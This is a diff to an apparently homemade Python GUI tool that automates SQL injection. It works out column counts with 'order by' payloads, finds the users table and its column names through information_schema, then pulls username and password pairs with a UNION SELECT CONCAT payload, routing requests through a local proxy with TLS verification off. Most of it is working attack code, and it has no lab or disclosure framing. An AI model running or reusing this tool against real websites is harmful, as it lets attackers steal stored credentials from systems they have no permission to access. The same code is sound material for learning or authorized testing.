@@ -10,6 +10,7 @@ from diff import difference
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def has_parameters(url):
@@ -74,19 +75,33 @@ def exploit_sqli_column_number(url,method,post_data=None):
         return False
     
     elif method == 'POST':
-        for i in range(1,50):
-            sql_payload = "'+order+by+%s--" %i
-            post_data[list(post_data.keys())[0]] = sql_payload
-            print(sql_payload)
-            print(post_data)
-            r = requests.post(url ,data=post_data ,verify=False, proxies=proxies)
-            res = r.text
-            if r.status_code == 500:
-                if i-1 == 0:
-                    return "one column"
-                return i - 1
-            i = i + 1
-        return False
+        try:
+            for i in range(1,50):
+                sql_payload = "'+order+by+%s--" %i
+                post_data[list(post_data.keys())[0]] = sql_payload
+                print(sql_payload)
+                print(post_data)
+                r = requests.post(url ,data=post_data ,verify=False, proxies=proxies)
+                if r.status_code == 500:
+                    if i-1 == 0:
+                        return "one column"
+                    return i - 1
+                i = i + 1
+        except:
+            for i in range(1,50):
+                sql_payload = "'+order+by+%s#" %i
+                post_data[list(post_data.keys())[0]] = sql_payload
+                print(sql_payload)
+                print(post_data)
+                r = requests.post(url ,data=post_data ,verify=False, proxies=proxies)
+                if r.status_code == 500:
+                    if i-1 == 0:
+                        return "one column"
+                    return i - 1
+                i = i + 1
+            # return False
+
+
 
 
 def exploit_sqli_string_field(url, num_col,method,post_data=None):
@@ -125,7 +140,7 @@ def generate_sql_payload(num_columns, text_column_index,detail,users_table=None)
     elif detail == "column_name":
         sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM information_schema.columns WHERE table_name = '%s'--" % users_table
     elif detail == "all":
-        null_columns[text_column_index - 1] = "CONCAT(username, '~~', password)"
+        null_columns[text_column_index - 1] = f"CONCAT({username_column}, '~~', {password_column})"
         sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM users--"  #"  WHERE table_name = '%s'--" % users_table
     return sql_payload  
 
@@ -162,7 +177,9 @@ def exploit_sqli_users_columns(url, users_table, method, post_data,num_col,strin
     print(sql_payload)
     res = perform_request(url, sql_payload, method, post_data)
     soup = BeautifulSoup(res.text, 'html.parser')
+    global username_column
     username_column = soup.find(text=re.compile('.*username.*'))
+    global password_column
     password_column = soup.find(text=re.compile('.*password.*'))
     return username_column, password_column
 
@@ -182,8 +199,16 @@ def main():
     def execute_sql_injection():
         try:
             url = url_entry.get().strip()
+            if url:
+                try:
+                    r = requests.get(url, verify=False,proxies=proxies)
+                    if r.status_code != 200:
+                        result_text.insert(tk.END, "Please provide a valid URL\n")
+                        return 
+                except:
+                    result_text.insert(tk.END, "Please provide a valid URL\n")   
         except IndexError:
-            messagebox.showerror("Error", "Please provide a valid URL.")
+            result_text.insert(tk.END, "Please provide a valid URL\n")
             return
 
         result_text.delete(1.0, tk.END)  # Clear previous results
@@ -193,8 +218,17 @@ def main():
         if method == 'POST':
             data = post_data_entry.get() if method == 'POST' else None
             # post_data={key: value for key, value in (item.split('=') for item in data.split('&'))}
-            
-
+            # post_data = {key: value for key, value in (item.split('=') for item in data.split('&'))}
+            if data is None:
+                result_text.insert(tk.END, "Please enter post data)\n")
+            try:
+                post_data = {key: value for key, value in (item.split('=') for item in data.split('&'))}
+                if 'username' in post_data and 'password' in post_data:
+                    return True, post_data
+                
+            except:
+                result_text.insert(tk.END, "Incorrect Post format (e.g username=user&password=pass)\n")
+                return
             if try_login_option.get():
                 login_successful = try_login(url, method, post_data)
                 if login_successful[0]:
@@ -208,9 +242,9 @@ def main():
                 result_text.insert(tk.END, "[-] Please select try login option.\n")
                 return
         elif method == "GET":
-            print("Looking for the users table...")
             if has_parameters(url):
                 users_table,num_col,string_column = exploit_sqli_users_table(url, method)
+                print("Looking for the users table...")
                 if users_table:
                     result_text.insert(tk.END, "Found the users table name: %s\n" % users_table)
                     username_column, password_column = exploit_sqli_users_columns(url, users_table, method, post_data,num_col,string_column)
